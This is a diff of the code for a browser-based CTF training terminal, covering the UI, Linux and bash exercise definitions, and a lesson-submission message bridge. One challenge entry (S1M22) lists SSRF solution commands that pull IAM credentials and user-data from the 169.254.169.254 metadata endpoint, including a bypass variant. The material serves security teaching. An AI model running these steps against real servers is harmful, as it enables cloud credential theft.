@@ -57,9 +57,20 @@
         }
 
         /* All content above canvas */
-        .terminal-topbar, #terminal-wrapper, .status-bar {
+        .terminal-topbar, .terminal-os-notice, #terminal-wrapper, .status-bar {
             position: relative;
             z-index: 1;
+        }
+
+        .terminal-os-notice {
+            flex-shrink: 0;
+            padding: 8px 14px;
+            font-size: 0.64rem;
+            line-height: 1.45;
+            color: var(--subtext0);
+            background: rgba(137, 180, 250, 0.08);
+            border-bottom: 1px solid rgba(137, 220, 235, 0.2);
+            letter-spacing: 0.03em;
         }
 
         /* ── Topbar: Hyprland / Kitty style ── */
@@ -87,6 +98,73 @@
         .dot-yellow { background: #f9e2af; box-shadow: 0 0 8px rgba(249,226,175,0.4); }
         .dot-green  { background: #a6e3a1; box-shadow: 0 0 8px rgba(166,227,161,0.4); }
 
+        .hypr-workspaces {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-right: 10px;
+        }
+        .hypr-ws {
+            min-width: 22px;
+            height: 22px;
+            padding: 0 6px;
+            border-radius: 6px;
+            font-size: 0.58rem;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--overlay0);
+            background: rgba(203, 166, 247, 0.08);
+            border: 1px solid rgba(203, 166, 247, 0.15);
+            cursor: default;
+            transition: background 0.15s, color 0.15s, box-shadow 0.15s;
+        }
+        .hypr-ws.active {
+            color: var(--crust);
+            background: linear-gradient(135deg, #1793d1, #89b4fa);
+            border-color: rgba(137, 180, 250, 0.6);
+            box-shadow: 0 0 14px rgba(23, 147, 209, 0.45);
+        }
+        .topbar-metrics {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-left: 8px;
+            padding-left: 12px;
+            border-left: 1px solid rgba(203, 166, 247, 0.2);
+            font-size: 0.58rem;
+            letter-spacing: 0.08em;
+            color: var(--overlay0);
+        }
+        .tm-pill {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            white-space: nowrap;
+        }
+        .tm-pill b { color: var(--teal); font-weight: normal; }
+        .tm-pill .tm-bar {
+            display: inline-block;
+            width: 44px;
+            height: 5px;
+            border-radius: 3px;
+            background: rgba(108, 112, 134, 0.35);
+            overflow: hidden;
+            vertical-align: middle;
+        }
+        .tm-pill .tm-bar i {
+            display: block;
+            height: 100%;
+            border-radius: 3px;
+            background: linear-gradient(90deg, var(--green), var(--teal));
+            transition: width 0.35s ease;
+        }
+        .tm-pacman {
+            color: var(--blue);
+        }
+        .tm-pacman span { color: var(--yellow); font-weight: bold; }
+
         .terminal-topbar-title {
             display: flex;
             align-items: center;
@@ -94,6 +172,7 @@
             font-size: 0.72rem;
             color: var(--subtext0);
             letter-spacing: 1.5px;
+            flex-wrap: wrap;
         }
         .ttt-arch   { color: var(--mauve); font-size: 1.1rem; text-shadow: 0 0 12px rgba(203,166,247,0.6); }
         .ttt-user   { color: var(--green); }
@@ -141,8 +220,26 @@
             padding: 4px 8px;
             overflow: hidden;
             background: rgba(8, 8, 8, 0.72);
+            position: relative;
         }
-        #terminal { height: 100%; }
+        /* CRT / phosphor — capa ligera estilo tty */
+        #terminal-wrapper::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            border-radius: 4px;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 0, 0, 0.13) 2px,
+                rgba(0, 0, 0, 0.13) 3px
+            );
+            opacity: 0.45;
+            z-index: 2;
+        }
+        #terminal { height: 100%; position: relative; z-index: 3; }
         .xterm { padding: 4px; }
         .xterm-viewport { background: transparent !important; }
 
@@ -161,6 +258,16 @@
             flex-shrink: 0;
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
+        }
+        .status-left-cluster {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            flex-wrap: wrap;
+        }
+        .status-kernel {
+            color: var(--sapphire);
+            font-size: 0.56rem;
         }
         .status-indicator { display: flex; align-items: center; gap: 6px; }
         .status-dot {
@@ -219,7 +326,7 @@
         }
         .bg-preset-grid {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
+            grid-template-columns: repeat(auto-fill, minmax(56px, 1fr));
             gap: 8px;
             margin-bottom: 14px;
         }
@@ -286,7 +393,7 @@
         body.embed-mode .status-bar { display: none !important; }
         body.embed-mode .terminal-bxf-footer { display: none !important; }
         body.embed-mode .terminal-topbar { border-radius: 0; border-top: none; border-left: none; border-right: none; }
-        body.embed-mode #terminal-wrapper { padding: 0; height: 100vh; }
+        body.embed-mode #terminal-wrapper { padding: 0; flex: 1; min-height: 0; height: auto; }
 
         /* Pie compacto — mismo universo BXF que el sitio principal */
         .terminal-bxf-footer {
@@ -423,6 +530,9 @@
         .hl-number   { color: #fab387; }
         .hl-function { color: #89b4fa; }
     </style>
+    <link rel="stylesheet" href="/tutorial.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="/tutorial.js" defer></script>
 </head>
 <body>
     <script>
@@ -465,6 +575,8 @@
         <div class="bg-preset-grid">
             <div class="bg-preset active"  id="preset-death"  style="background-image:url('images/Death_.jpg')"   onclick="setBgPreset('death')"  title="Death"></div>
             <div class="bg-preset"         id="preset-nebula" style="background:radial-gradient(ellipse at 30% 60%,rgba(203,166,247,.35),rgba(137,180,250,.15),#11111b);" onclick="setBgPreset('nebula')" title="Nebula"></div>
+            <div class="bg-preset"         id="preset-arch"   style="background:linear-gradient(165deg,#0a3a52 0%,#11111b 45%,#1793d1 180%);" onclick="setBgPreset('arch')" title="Arch blue"></div>
+            <div class="bg-preset"         id="preset-matrix" style="background:#020805;box-shadow:inset 0 0 40px rgba(0,255,100,0.12);" onclick="setBgPreset('matrix')" title="Matrix rain"></div>
             <div class="bg-preset"         id="preset-none"   style="background:var(--crust);"                    onclick="setBgPreset('none')"   title="None (solid)"></div>
         </div>
         <div class="bg-menu-row">
@@ -484,11 +596,23 @@
             <div class="dot-green"></div>
         </div>
         <div class="terminal-topbar-title">
+            <div class="hypr-workspaces" id="hypr-workspaces" aria-hidden="true">
+                <span class="hypr-ws active" data-ws="1">1</span>
+                <span class="hypr-ws" data-ws="2">2</span>
+                <span class="hypr-ws" data-ws="3">3</span>
+                <span class="hypr-ws" data-ws="4">4</span>
+                <span class="hypr-ws" data-ws="5">5</span>
+            </div>
             <span class="ttt-arch">&#9651;</span>
             <span class="ttt-user">entity</span><span class="ttt-at">@</span><span class="ttt-host">archlinux</span>
             <span class="ttt-sep">:</span><span class="ttt-path">~/ctf</span>
             <span class="ttt-pipe">|</span>
-            <span class="ttt-info">kitty &middot; zsh &middot; BXF_TERMINAL v5.0</span>
+            <span class="ttt-info">Hyprland &middot; kitty &middot; zsh &middot; linux <span id="topbar-kernel">6.14.2-arch1-1</span></span>
+            <div class="topbar-metrics" id="topbar-metrics">
+                <span class="tm-pill" title="CPU (simulado)">CPU <b id="metric-cpu-pct">7</b>% <span class="tm-bar"><i id="metric-cpu-bar" style="width:7%"></i></span></span>
+                <span class="tm-pill" title="RAM (simulado)">RAM <b id="metric-mem-pct">24</b>% <span class="tm-bar"><i id="metric-mem-bar" style="width:24%"></i></span></span>
+                <span class="tm-pacman" title="Repos sincronizados (ficción)">pacman <span id="metric-updates">0</span> actualizaciones</span>
+            </div>
         </div>
         <div class="terminal-topbar-actions">
             <button class="topbar-btn" onclick="toggleBgMenu()" title="Change background">BG</button>
@@ -501,12 +625,29 @@
         </div>
     </div>
 
+    <p class="terminal-os-notice" id="terminal-os-notice" role="note"></p>
+    <script>
+    (function () {
+        var el = document.getElementById('terminal-os-notice');
+        if (!el) return;
+        var lang = (typeof localStorage !== 'undefined' && localStorage.getItem('lang')) || 'en';
+        var msg =
+            lang === 'es'
+                ? 'Recomendamos usar tu propio sistema operativo (p. ej. Linux en una VM o dual boot) para practicar de verdad. Esta terminal en el navegador es un sandbox con limitaciones.'
+                : 'We recommend using your own operating system (e.g. Linux in a VM or dual boot) for real practice. This in-browser terminal is a sandbox with limitations.';
+        el.textContent = msg;
+    })();
+    </script>
+
     <div id="terminal-wrapper">
         <div id="terminal"></div>
     </div>
 
     <div class="status-bar">
-        <span class="status-tools">TAB: autocomplete &nbsp;&bull;&nbsp; &#x2191;&#x2193;: history &nbsp;&bull;&nbsp; Ctrl+C: cancel/copy &nbsp;&bull;&nbsp; Ctrl+V: paste &nbsp;&bull;&nbsp; Ctrl+L: clear</span>
+        <span class="status-left-cluster">
+            <span class="status-kernel" id="status-kernel-str">Linux archlinux 6.14.2-arch1-1 x86_64</span>
+            <span class="status-tools">TAB &middot; hist &middot; Ctrl+C &middot; Ctrl+V &middot; Ctrl+L</span>
+        </span>
         <span id="status-time"></span>
     </div>
 
@@ -524,7 +665,7 @@
     window.confirm = (m) => { console.warn('[terminal:confirm]', m); return true; };
     window.prompt  = (m) => { console.warn('[terminal:prompt]', m); return null; };
  
-    // [NEW] BRIDGE: Listen for script execution requests from learn.html
+    // [NEW] BRIDGE: Listen for script execution requests from learn.html (handlers defined after CHALLENGE_DB)
     window.addEventListener('message', async (event) => {
         if (event.data && event.data.type === 'SUBMIT_CHALLENGE') {
             termSubmit([]);
@@ -534,6 +675,14 @@
             const { code, filename } = event.data;
             const output = await runHeadless(code, filename || 'tmp_run.sh');
             event.source.postMessage({ type: 'EXECUTION_RESULT', output, vfiles: VFILES }, event.origin);
+            return;
+        }
+        if (event.data && event.data.type === 'BASH_LEARN_SUBMIT') {
+            await handleBashLearnSubmit(event);
+            return;
+        }
+        if (event.data && event.data.type === 'REQUEST_CHALLENGE_HINT') {
+            handleChallengeHintRequest(event);
         }
     });
 
@@ -585,6 +734,24 @@
         'LX-5.1': { title:'System Hardening', cat:'Linux', diff:'Easy', hint:'Find SUID files and save results to /home/entity/ctf/suid_list.', validator: v => !!v['/home/entity/ctf/suid_list'] },
         'LX-6.1': { title:'Journal Merge', cat:'Linux', diff:'Easy', hint:'Concatenate two logs into merged.log.', validator: v => (v['/home/entity/ctf/merged.log']||[]).length >= 2 },
         'LX-6.2': { title:'Disk Snapshot', cat:'Linux', diff:'Easy', hint:'Save df output to a file.', validator: v => (v['/home/entity/ctf/df_snapshot.txt']||[]).join('\n').includes('Filesystem') },
+        'LX-1.4': { title:'Copy Channel', cat:'Linux', diff:'Easy', hint:'cp orig to dupe, then touch /home/entity/ctf/copy_lab.', validator: v => !!v['/home/entity/ctf/copy_lab'] && !!v['/home/entity/ctf/dupe.txt'] },
+        'LX-1.5': { title:'Rename Runway', cat:'Linux', diff:'Easy', hint:'mv inbox to outbox and touch rename_done.', validator: v => !!v['/home/entity/ctf/rename_done'] && !!v['/home/entity/ctf/outbox.txt'] },
+        'LX-2.4': { title:'Find Journal', cat:'Linux', diff:'Easy', hint:'Redirect find output to /home/entity/ctf/find_glob_log.', validator: v => !!v['/home/entity/ctf/find_glob_log'] },
+        'LX-2.5': { title:'Uniq Stack', cat:'Linux', diff:'Easy', hint:'printf lines | sort | uniq > sortuniq_out', validator: v => { const t = (v['/home/entity/ctf/sortuniq_out']||[]).join('\n'); return t.includes('a') && t.includes('b'); } },
+        'LX-3.4': { title:'Process Ack', cat:'Linux', diff:'Easy', hint:'ps aux > ps_snapshot and touch proc_ready.', validator: v => !!v['/home/entity/ctf/proc_ready'] && !!v['/home/entity/ctf/ps_snapshot'] },
+        'LX-3.5': { title:'Socket Clip', cat:'Linux', diff:'Easy', hint:'ss -antp | head -5 > ss_sample', validator: v => !!v['/home/entity/ctf/ss_sample'] },
+        'LX-4.3': { title:'Grep Pack', cat:'Linux', diff:'Easy', hint:'grep BXF grep_src.txt > grep_pack', validator: v => !!v['/home/entity/ctf/grep_pack'] && (v['/home/entity/ctf/grep_pack']||[]).join('\n').includes('BXF') },
+        'LX-4.4': { title:'Word Metrics', cat:'Linux', diff:'Easy', hint:'wc -l wc_src.txt > wc_report', validator: v => /\d/.test((v['/home/entity/ctf/wc_report']||[]).join(' ')) },
+        'LX-5.2': { title:'Checksum Lineage', cat:'Linux', diff:'Easy', hint:'md5sum md_a.txt > md5_manifest', validator: v => !!v['/home/entity/ctf/md5_manifest'] },
+        'LX-5.3': { title:'Diff Briefing', cat:'Linux', diff:'Easy', hint:'diff d1.txt d2.txt > diff_brief', validator: v => !!v['/home/entity/ctf/diff_brief'] && ((v['/home/entity/ctf/diff_brief']||[]).join('\n').trim().length > 0) },
+        'LX-6.3': { title:'Archive Pulse', cat:'Linux', diff:'Easy', hint:'tar -czf minimal.tar.gz md_a.txt', validator: v => !!v['/home/entity/ctf/minimal.tar.gz'] },
+        'LX-6.4': { title:'Magic Bytes', cat:'Linux', diff:'Easy', hint:'file sample.txt > file_types.txt', validator: v => !!v['/home/entity/ctf/file_types.txt'] && (v['/home/entity/ctf/file_types.txt']||[]).join('\n').toLowerCase().includes('ascii') },
+        'LX-7.1': { title:'Env Snapshot', cat:'Linux', diff:'Easy', hint:'env | head -20 > env_dump.txt', validator: v => !!v['/home/entity/ctf/env_dump.txt'] && (v['/home/entity/ctf/env_dump.txt']||[]).length >= 1 },
+        'LX-7.2': { title:'Tee Fork', cat:'Linux', diff:'Easy', hint:'echo OK | tee tee_a.txt > tee_b.txt', validator: v => !!v['/home/entity/ctf/tee_a.txt'] && !!v['/home/entity/ctf/tee_b.txt'] },
+        'LX-7.3': { title:'Head & Tail Story', cat:'Linux', diff:'Easy', hint:'head/tail story.txt into head_story and tail_story', validator: v => !!v['/home/entity/ctf/head_story.txt'] && !!v['/home/entity/ctf/tail_story.txt'] },
+        'LX-8.1': { title:'Hex Note', cat:'Linux', diff:'Easy', hint:'echo BXF | xxd > hex_sample.txt', validator: v => !!v['/home/entity/ctf/hex_sample.txt'] },
+        'LX-8.2': { title:'BXF Hunt', cat:'Linux', diff:'Easy', hint:'grep BXF blob.txt > strings_hit.txt', validator: v => !!v['/home/entity/ctf/strings_hit.txt'] && (v['/home/entity/ctf/strings_hit.txt']||[]).join('\n').includes('BXF') },
+        'LX-8.3': { title:'Pipeline Capstone', cat:'Linux', diff:'Easy', hint:'echo capstone > cap_plain.txt; md5sum cap_plain.txt > cap_md5.txt; touch pipeline_capstone', validator: v => !!v['/home/entity/ctf/pipeline_capstone'] && !!v['/home/entity/ctf/cap_md5.txt'] },
         'BA-1.1': { title:'Hello Bash', cat:'Scripting', diff:'Easy', hint:'Create script.sh that prints a greeting (Hello World, HI, or HOLA)', validator: (v) => /echo\s+(?:"Hello World"|HI|HOLA)/.test((v['/home/entity/ctf/script.sh']||[]).join('\n')) },
         'BA-1.2': { title:'Neural Variables', cat:'Scripting', diff:'Easy', hint:'Store a value and save it to /home/entity/ctf/var_saved.', validator: v => !!v['/home/entity/ctf/var_saved'] },
         'BA-2.1': { title:'Numerical Branching', cat:'Scripting', diff:'Easy', hint:'Use if/else logic and create /home/entity/ctf/branch_result.', validator: v => !!v['/home/entity/ctf/branch_result'] },
@@ -669,33 +836,164 @@
         'S1M22':{ title:'The Final Link',    cat:'Web',      diff:'Insane', pts:1000,hint:'SSRF → 169.254.169.254. IMDSv1: no token needed.', steps:[{i:'SSRF test:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/"'},{i:'IMDS metadata:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM creds:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'},{i:'user-data (juicy):',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/user-data"'},{i:'IPv6 bypass:',c:'curl -X POST https://target/fetch -d "url=http://[::ffff:169.254.169.254]/latest/meta-data/"'},{i:'FLAG:',c:'echo bxf{metadata_imds_v1_leak}'}]},
     };
 
+    /** Learn panel (bash): apply editor text — file kind writes to /home/entity/ctf/<name>; snippet runs whole buffer as bash .learn_submit.sh */
+    const BASH_LEARN_MAP = {
+        'BA-1.1': { kind: 'file', file: 'script.sh' },
+        'BA-1.2': { kind: 'snippet' },
+        'BA-2.1': { kind: 'snippet' },
+        'BA-2.2': { kind: 'snippet' },
+        'BA-3.1': { kind: 'snippet' },
+        'BA-3.2': { kind: 'snippet' },
+        'BA-4.1': { kind: 'snippet' },
+        'BA-5.1': { kind: 'snippet' },
+        'BA-6.1': { kind: 'file', file: 'logic.sh' },
+        'BA-6.2': { kind: 'file', file: 'primes.sh', postRun: 'bash primes.sh > /home/entity/ctf/primes.txt' },
+        'BA-6.3': { kind: 'file', file: 'fib.sh', postRun: 'bash fib.sh 5 > /home/entity/ctf/fib.txt' },
+        'BA-7.1': { kind: 'snippet' },
+        'BA-7.2': { kind: 'snippet' },
+        'BA-7.3': { kind: 'snippet' },
+        'BA-8.1': { kind: 'file', file: 'sanitize.sh', postRun: 'bash sanitize.sh' },
+        'BA-8.2': { kind: 'file', file: 'shield.sh' },
+        'BA-8.3': { kind: 'snippet' },
+        'BA-9.1': { kind: 'file', file: 'arity.sh' },
+        'BA-9.2': { kind: 'file', file: 'flags.sh' },
+        'BA-9.3': { kind: 'snippet' },
+        'BA-10.1': { kind: 'snippet' },
+        'BA-10.2': { kind: 'snippet' },
+        'BA-10.3': { kind: 'snippet' },
+        'BA-11.1': { kind: 'file', file: 'trap.sh', postRun: 'bash trap.sh' },
+        'BA-11.2': { kind: 'file', file: 'strict.sh' },
+        'BA-11.3': { kind: 'file', file: 'watchdog.sh' },
+        'BA-12.1': { kind: 'snippet' },
+        'BA-12.2': { kind: 'file', file: 'rev.sh', postRun: 'bash rev.sh "1 2 3" > /home/entity/ctf/rev.txt' },
+        'BA-12.3': { kind: 'file', file: 'transpose.sh', postRun: 'bash transpose.sh "1 2; 3 4" > /home/entity/ctf/transposed.txt' },
+        'BA-13.1': { kind: 'file', file: 'input_loop.sh' },
+        'BA-13.2': { kind: 'file', file: 'menu.sh' },
+        'BA-13.3': { kind: 'snippet' },
+        'BA-14.1': { kind: 'snippet' },
+        'BA-14.2': { kind: 'file', file: 'disk_alert.sh' },
+        'BA-14.3': { kind: 'file', file: 'fix_perms.sh' },
+        'BA-15.1': { kind: 'snippet' },
+        'BA-15.2': { kind: 'snippet' },
+        'BA-15.3': { kind: 'snippet' },
+    };
+
+    function bashLearnWriteFile(relPath, content) {
+        const clean = String(relPath || '').replace(/^\/+/, '');
+        const abs = '/home/entity/ctf/' + clean;
+        const lines = (content == null ? '' : String(content)).replace(/\r\n/g, '\n').split('\n');
+        VFILES[abs] = lines;
+        _saveVFiles();
+    }
+
+    async function applyBashLearnContent(text, modId) {
+        const cfg = BASH_LEARN_MAP[modId];
+        if (!cfg) throw new Error('No editor mapping for ' + modId);
+        if (cfg.kind === 'file') {
+            bashLearnWriteFile(cfg.file, text);
+            if (cfg.postRun) await runCommand(cfg.postRun);
+            return;
+        }
+        if (cfg.kind === 'snippet') {
+            bashLearnWriteFile('.learn_submit.sh', text);
+            await runCommand('bash .learn_submit.sh');
+        }
+    }
+
+    function runChallengeValidator(modId) {
+        const ch = CHALLENGE_DB[modId];
+        if (!ch || !ch.validator) return { ok: false, hint: null };
+        try {
+            const ok = !!ch.validator(VFILES, CWD);
+            return { ok, hint: ch.hint || null };
+        } catch (e) {
+            console.warn(e);
+            return { ok: false, hint: ch.hint || null };
+        }
+    }
+
+    async function handleBashLearnSubmit(event) {
+        const content = event.data && event.data.content;
+        const src = event.source;
+        const origin = event.origin || '*';
+        const urlParams = new URLSearchParams(window.location.search);
+        const modId = (urlParams.get('lesson') || urlParams.get('m') || '').toUpperCase();
+        if (!modId || !CHALLENGE_DB[modId]) {
+            src.postMessage({ type: 'BASH_LEARN_RESULT', ok: false, hint: 'No challenge loaded in the terminal.' }, origin);
+            return;
+        }
+        if (!BASH_LEARN_MAP[modId]) {
+            src.postMessage({ type: 'BASH_LEARN_RESULT', ok: false, hint: 'No editor mapping for this lesson.' }, origin);
+            return;
+        }
+        try {
+            await applyBashLearnContent(content == null ? '' : String(content), modId);
+        } catch (e) {
+            console.error(e);
+            src.postMessage({ type: 'BASH_LEARN_RESULT', ok: false, hint: (e && e.message) ? String(e.message) : String(e) }, origin);
+            return;
+        }
+        const { ok, hint } = runChallengeValidator(modId);
+        if (ok) {
+            pl(`\x1b[34m[VALIDATION]\x1b[0m Checking objective for module: \x1b[1m${modId}\x1b[0m...`);
+            pl('\x1b[32m' + '═'.repeat(45) + '\x1b[0m');
+            pl('\x1b[32m[ CRITICAL SUCCESS ] OBJECTIVE VERIFIED!\x1b[0m');
+            pl('\x1b[32m' + '═'.repeat(45) + '\x1b[0m');
+            window.parent.postMessage({ type: 'CHALLENGE_SUCCESS', modId }, '*');
+        } else {
+            pe('\x1b[31m[!] Objective not met yet.\x1b[0m');
+            if (hint) pl(`\x1b[33m💡 HINT:\x1b[0m ${hint}`);
+            src.postMessage({ type: 'BASH_LEARN_RESULT', ok: false, hint: hint || '' }, origin);
+        }
+    }
+
+    function handleChallengeHintRequest(event) {
+        const src = event.source;
+        const origin = event.origin || '*';
+        const urlParams = new URLSearchParams(window.location.search);
+        const modId = (urlParams.get('lesson') || urlParams.get('m') || '').toUpperCase();
+        const ch = CHALLENGE_DB[modId];
+        src.postMessage({
+            type: 'CHALLENGE_HINT',
+            modId,
+            hint: (ch && ch.hint) ? ch.hint : '',
+            title: (ch && ch.title) ? ch.title : ''
+        }, origin);
+    }
+
+    const ARCH_KERNEL = '6.14.2-arch1-1';
     const BOOT = [
         '\x1b[2J\x1b[H',
-        '\x1b[35m                   .\x1b[0m',
-        '\x1b[35m                  / \\\x1b[0m',
-        '\x1b[35m                 /   \\\x1b[0m',
-        '\x1b[35m                / ,\'  \\\x1b[0m',
-        '\x1b[35m               / (____) \\\x1b[0m',
-        '\x1b[35m              /___________\\\x1b[0m',
+        '\x1b[90m:: running in WebAssembly-free mode — pure browser chaos\x1b[0m',
         '',
-        '\x1b[1m\x1b[35mentity\x1b[90m@\x1b[34marchlinux\x1b[0m',
-        '\x1b[35m─────────────────────────────\x1b[0m',
-        '\x1b[34mOS:\x1b[0m       Arch Linux (BXF CTF Terminal)',
-        '\x1b[34mKernel:\x1b[0m   6.8.0-arch1-1',
-        '\x1b[34mShell:\x1b[0m    zsh 5.9 (browser)',
-        '\x1b[34mTerminal:\x1b[0m Kitty / xterm.js 5.3.0',
-        '\x1b[34mTheme:\x1b[0m    \x1b[35mCatppuccin Mocha\x1b[0m',
-        '\x1b[34mColors:\x1b[0m   \x1b[31m■\x1b[0m \x1b[33m■\x1b[0m \x1b[32m■\x1b[0m \x1b[36m■\x1b[0m \x1b[34m■\x1b[0m \x1b[35m■\x1b[0m',
-        '\x1b[34mTools:\x1b[0m    80+ CTF tools loaded',
+        '\x1b[36m                  -`\x1b[0m',
+        '\x1b[36m                 .o+`\x1b[0m          \x1b[1m\x1b[38;5;141mBREAKER\x1b[38;5;75m_\x1b[38;5;141mFIXER\x1b[0m \x1b[90m//\x1b[0m \x1b[33mArch-style CTF shell\x1b[0m',
+        '\x1b[36m                `ooo/\x1b[0m',
+        '\x1b[36m               `+oooo:\x1b[0m         \x1b[32m[\x1b[0m \x1b[1mOK\x1b[0m \x1b[32m]\x1b[0m \x1b[90mStarted\x1b[0m \x1b[36mSession ctf-lab.slice\x1b[0m',
+        '\x1b[36m              `+oooooo:\x1b[0m        \x1b[32m[\x1b[0m \x1b[1mOK\x1b[0m \x1b[32m]\x1b[0m \x1b[90mReached target\x1b[0m \x1b[36mNetwork\x1b[0m',
+        '\x1b[36m              -+oooooo+:\x1b[0m       \x1b[32m[\x1b[0m \x1b[1mOK\x1b[0m \x1b[32m]\x1b[0m \x1b[90mListening on\x1b[0m \x1b[35m127.0.0.1:ctf\x1b[0m',
+        '\x1b[36m            `/:-:++oooo+:\x1b[0m       \x1b[32m[\x1b[0m \x1b[1mOK\x1b[0m \x1b[32m]\x1b[0m \x1b[90mMounted\x1b[0m \x1b[36m/home/entity\x1b[0m',
+        '\x1b[36m           `/++++/+++++++:\x1b[0m      \x1b[32m[\x1b[0m \x1b[1mOK\x1b[0m \x1b[32m]\x1b[0m \x1b[90mHyprland + Wayland (UI sim)\x1b[0m',
+        '\x1b[36m          `/++++++++++++++:\x1b[0m',
+        '\x1b[36m         `/+++oooooooooooo/`\x1b[0m     \x1b[34mOS\x1b[0m       Arch Linux \x1b[90m+\x1b[0m BXF overlay',
+        '\x1b[36m        ./ooosssso++osssssso+`\x1b[0m   \x1b[34mKernel\x1b[0m   ' + ARCH_KERNEL + ' \x1b[90mPREEMPT_DYNAMIC\x1b[0m',
+        '\x1b[36m       .oossssssssssosssssssso`\x1b[0m  \x1b[34mPackages\x1b[0m \x1b[33m1847\x1b[0m \x1b[90m(pacman -Q | wc -l · sim)\x1b[0m',
+        '\x1b[36m      :ssssssssssssssssssssssss`\x1b[0m \x1b[34mShell\x1b[0m    zsh 5.9 \x1b[90m+ grml config (fake)\x1b[0m',
+        '\x1b[36m     :ssssssssssssssssssssssssss`\x1b[0m \x1b[34mWM\x1b[0m       Hyprland 0.42.x',
+        '\x1b[36m    /ssssssssssssssssssssssssssss`\x1b[0m \x1b[34mTerminal\x1b[0m kitty / \x1b[35mxterm.js 5.3\x1b[0m',
+        '\x1b[36m   /ssssssssssssssssssssssssssssss`\x1b[0m \x1b[34mTheme\x1b[0m    Catppuccin Mocha',
+        '\x1b[36m  /ssssssssssssssssssssssssssssssss`\x1b[0m \x1b[34mUptime\x1b[0m   \x1b[32m42d 6h\x1b[0m \x1b[90m(because we said so)\x1b[0m',
+        '\x1b[36m /ssssssssssssssssssssssssssssssssss`\x1b[0m',
+        '\x1b[36m/ssssssssssssssssssssssssssssssssssss`\x1b[0m \x1b[31m■\x1b[0m \x1b[33m■\x1b[0m \x1b[32m■\x1b[0m \x1b[36m■\x1b[0m \x1b[34m■\x1b[0m \x1b[35m■\x1b[0m \x1b[90m·\x1b[0m \x1b[38;5;75m#\x1b[38;5;141m1793d1\x1b[0m Arch blue accent',
+        '\x1b[36m::::::::::::::::::::::::::::::::::::::\x1b[0m',
         '',
-        '\x1b[32m✔\x1b[0m HTTP engine   \x1b[36mFetch API  →  real network requests\x1b[0m',
-        '\x1b[32m✔\x1b[0m Crypto engine \x1b[36mSubtleCrypto + AES · RSA · custom ciphers\x1b[0m',
-        '\x1b[32m✔\x1b[0m Script engine \x1b[36mJavaScript vm (python3 -c compatible)\x1b[0m',
-        '\x1b[32m✔\x1b[0m Editors       \x1b[36mnvim · nano (in-browser)\x1b[0m',
-        '\x1b[32m✔\x1b[0m Recon suite   \x1b[36mwhois · dig · nslookup · traceroute (sim)\x1b[0m',
-        '\x1b[33m⚠\x1b[0m  Raw TCP tools (nmap, netcat) unavailable in browser sandbox',
+        '\x1b[32m✔\x1b[0m \x1b[1mHTTP\x1b[0m        \x1b[36mcurl\x1b[0m → Fetch API · TLS · cookies · JSON',
+        '\x1b[32m✔\x1b[0m \x1b[1mCrypto\x1b[0m      \x1b[36mAES · RSA · JWT · hashes · classic ciphers\x1b[0m',
+        '\x1b[32m✔\x1b[0m \x1b[1mFilesystem\x1b[0m  \x1b[36mVFS\x1b[0m persistente · pipes · redirects · \x1b[36m./script.sh\x1b[0m',
+        '\x1b[32m✔\x1b[0m \x1b[1mEditors\x1b[0m     \x1b[36mnvim\x1b[0m · nano en overlay (no dejes flags en el disco equivocado)',
+        '\x1b[33m⚠\x1b[0m  ICMP/TCP crudo limitado por el sandbox del navegador · \x1b[90mnmap/ping\x1b[0m son teatro bien documentado',
         '',
-        '\x1b[35mType \x1b[1mhelp\x1b[0;35m for all commands  ·  TAB to autocomplete  ·  ↑↓ history\x1b[0m',
+        '\x1b[35m\x1b[1m::\x1b[0;35m\x1b[0m \x1b[35mneofetch\x1b[0m · \x1b[35mpacman -Syu\x1b[0m · \x1b[35mjournalctl -b\x1b[0m · \x1b[35mhtop\x1b[0m · \x1b[1mhelp\x1b[0m  \x1b[90mTAB · ↑↓\x1b[0m',
     ];
 
     const _VFILES_DEFAULT = {
@@ -712,6 +1010,19 @@
         '/home/entity/.bash_history':['challenges','solve S1M02','rot13 "cvs{ebg13_vf_pynffvp}"','hash sha256 password123','curl https://breakerxfixer-api.onrender.com/api/v1'],
         '/etc/hostname': ['archlinux'],
         '/etc/issue': ['Arch Linux \r (\l)'],
+        '/etc/os-release': [
+            'NAME="Arch Linux"',
+            'PRETTY_NAME="Arch Linux"',
+            'ID=arch',
+            'BUILD_ID=rolling',
+            'ANSI_COLOR="38;2;23;147;209"',
+            'HOME_URL="https://archlinux.org/"',
+            'DOCUMENTATION_URL="https://wiki.archlinux.org/"',
+            'SUPPORT_URL="https://bbs.archlinux.org/"',
+            'BUG_REPORT_URL="https://bugs.archlinux.org/"',
+            'LOGO=archlinux',
+            'BXF_OVERLAY="Breaker_X_Fixer CTF Terminal (browser)"',
+        ],
         '/etc/pacman.conf': ['# Arch Linux Pacman Configuration'],
         '/home/entity/ctf/tools/README.txt': ['Pentest tools are simulated here. Use nmap, sqlmap, etc.'],
         '/etc/passwd': [
@@ -745,9 +1056,9 @@
     let CWD = '/home/entity/ctf';
     function getPrompt() {
         const displayCwd = CWD.replace('/home/entity', '~');
-        return `\r\n\x1b[35m╭─\x1b[0m \x1b[32mentity\x1b[90m@\x1b[34marchlinux \x1b[35m${displayCwd} \x1b[33m[CTF]\x1b[0m\r\n\x1b[35m╰─❯\x1b[0m `;
+        return `\r\n\x1b[38;5;141m╭\x1b[38;5;75m─\x1b[0m \x1b[32mentity\x1b[90m@\x1b[38;5;75marchlinux\x1b[0m \x1b[38;5;141m${displayCwd}\x1b[0m \x1b[33m[CTF·lab]\x1b[0m\r\n\x1b[38;5;141m╰\x1b[38;5;75m─\x1b[0m\x1b[1m\x1b[38;5;46m❯\x1b[0m `;
     }
